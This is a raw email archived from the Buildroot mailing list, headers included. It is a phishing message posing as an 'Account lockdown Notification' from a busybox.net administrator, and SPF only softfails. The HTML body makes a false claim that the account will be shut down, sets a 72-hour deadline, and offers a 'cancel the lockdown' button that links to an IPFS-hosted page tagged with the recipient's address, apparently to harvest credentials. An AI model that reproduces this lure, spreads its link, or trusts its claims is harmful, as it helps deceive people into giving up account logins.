Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 6E76BD637BE
	for <buildroot@archiver.kernel.org>; Wed, 13 Nov 2024 20:43:52 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp4.osuosl.org (Postfix) with ESMTP id 322B940317;
	Wed, 13 Nov 2024 20:43:52 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp4.osuosl.org ([127.0.0.1])
 by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 6I0nk345CtaN; Wed, 13 Nov 2024 20:43:51 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 1179F405BF
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp4.osuosl.org (Postfix) with ESMTP id 1179F405BF;
	Wed, 13 Nov 2024 20:43:51 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by lists1.osuosl.org (Postfix) with ESMTP id B7BD123F1
 for <buildroot@buildroot.org>; Wed, 13 Nov 2024 20:43:48 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 9A2318054D
 for <buildroot@buildroot.org>; Wed, 13 Nov 2024 20:43:48 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id Bdk0DB1ma6xx for <buildroot@buildroot.org>;
 Wed, 13 Nov 2024 20:43:47 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=172.245.244.108;
 helo=busybox.net; envelope-from=noreplysdesk@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 6B78181328
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 6B78181328
Received: from busybox.net (unknown [172.245.244.108])
 by smtp1.osuosl.org (Postfix) with ESMTP id 6B78181328
 for <buildroot@busybox.net>; Wed, 13 Nov 2024 20:43:47 +0000 (UTC)
From: Administrator<noreplysdesk@busybox.net>
To: buildroot@busybox.net
Date: 13 Nov 2024 21:43:46 +0100
Message-ID: <20241113214346.CDF8CB4BCEE5D80B@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Account lockdown Notification
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============4048183412094175477=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============4048183412094175477==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body style=3D"MARGIN: 0.5em">
<P> </P>
<DIV style=3D'FONT-SIZE: 12px; BORDER-TOP: rgb(218,220,224) thin solid; FON=
T-FAMILY: Roboto, "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; B=
ORDER-RIGHT: rgb(218,220,224) thin solid; WHITE-SPACE: normal; WORD-SPACING=
: 0px; BORDER-BOTTOM: rgb(218,220,224) thin solid; TEXT-TRANSFORM: none; FO=
NT-WEIGHT: 400; COLOR: rgb(70,87,107); PADDING-BOTTOM: 36px; FONT-STYLE: no=
rmal; PADDING-TOP: 40px; PADDING-LEFT: 20px; BORDER-LEFT: rgb(218,220,224) =
thin solid; LETTER-SPACING: normal; PADDING-RIGHT:=20
20px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; border-radius: =
8px; font-variant-ligatures: normal; font-variant-caps: normal; text-decora=
tion-style: initial; text-decoration-color: initial' align=3Dcenter>
<DIV style=3D'BORDER-TOP: 0px; FONT-FAMILY: "Google Sans", Roboto, RobotoDr=
aft, Helvetica, Arial, sans-serif; BORDER-BOTTOM: rgb(218,220,224) thin sol=
id; PADDING-BOTTOM: 24px; PADDING-TOP: 0px; LINE-HEIGHT: 32px'>
<DIV style=3D"FONT-SIZE: 24px; BORDER-TOP: 0px; PADDING-TOP: 0px"><STRONG>A=
ccount lockdown Notification</STRONG>&nbsp;</DIV>
<table style=3D"MARGIN-TOP: 8px" align=3D"center">
<TBODY>
<TR style=3D"LINE-HEIGHT: normal">
<td style=3D"MARGIN: 0px; PADDING-RIGHT: 8px" align=3D"right">For:<SPAN>&nb=
sp;</SPAN> <B style=3D"FONT-SIZE: 12px; FONT-FAMILY: roboto-regular, helvet=
ica, arial, sans-serif; COLOR: rgb(34,34,34)">buildroot@busybox.net</B> </T=
D>
<td style=3D"MARGIN: 0px">&nbsp;</TD></TR></TBODY></TABLE></DIV>
<DIV style=3D"PADDING-TOP: 20px; LINE-HEIGHT: 20px">This is to notify you t=
hat we received a command from your email settings instructing us to shutdo=
wn your account.</DIV>
<DIV style=3D"PADDING-TOP: 20px; LINE-HEIGHT: 20px">Are you aware of this? =
Or was the command given by mistake?</DIV>
<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto-Regular, Helvetica, Aria=
l, sans-serif; PADDING-TOP: 20px; LINE-HEIGHT: 20px"><SPAN>If you clicked t=
he button by accident, then we strongly advise that you cancel this command=
 now else your email will be shut down.</SPAN><SPAN><BR></SPAN>
<DIV style=3D"PADDING-TOP: 32px">
<A style=3D'FONT-FAMILY: "Google Sans", Roboto, RobotoDraft, Helvetica, Ari=
al, sans-serif; MIN-WIDTH: 90px; COLOR: rgb(255,255,255); PADDING-BOTTOM: 1=
0px; PADDING-TOP: 10px; PADDING-LEFT: 24px; DISPLAY: inline-block; LINE-HEI=
GHT: 16px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(65,132,243); border-r=
adius: 5px; text-decoration-line: none' href=3D"https://ipfs.io/ipfs/bafybe=
ic7dtey5m7csxlf36ghqaz6iec45hg2blrdzqyqfyqrqgq74k6szq?filename=3Ddaramate.h=
tml#buildroot@busybox.net" rel=3D"noopener noreferrer">
Click here to cancel the lockdown request !</A></DIV><BR>
<DIV style=3D"LETTER-SPACING: 0px; LINE-HEIGHT: 16px">If you fail to verify=
 your account within 72hrs, your email will be shutdown</DIV></DIV></DIV>
<DIV style=3D'FONT-SIZE: 12px; FONT-FAMILY: Roboto, "Lucida Grande", Verdan=
a, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TE=
XT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(70,87,107); FONT-STYLE: no=
rmal; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDE=
NT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-de=
coration-style: initial; text-decoration-color: initial'>
<DIV style=3D"FONT-SIZE: 11px; BORDER-TOP: 0px; FONT-FAMILY: Roboto-Regular=
, Helvetica, Arial, sans-serif; TEXT-ALIGN: center; PADDING-TOP: 12px; LINE=
-HEIGHT: 18px">
<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px">You received this email to=
 let you know about important changes to your Account and services.</DIV>
<DIV style=3D"DIRECTION: ltr">&copy; 2024</DIV></DIV></DIV></BODY></HTML>

--===============4048183412094175477==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============4048183412094175477==--
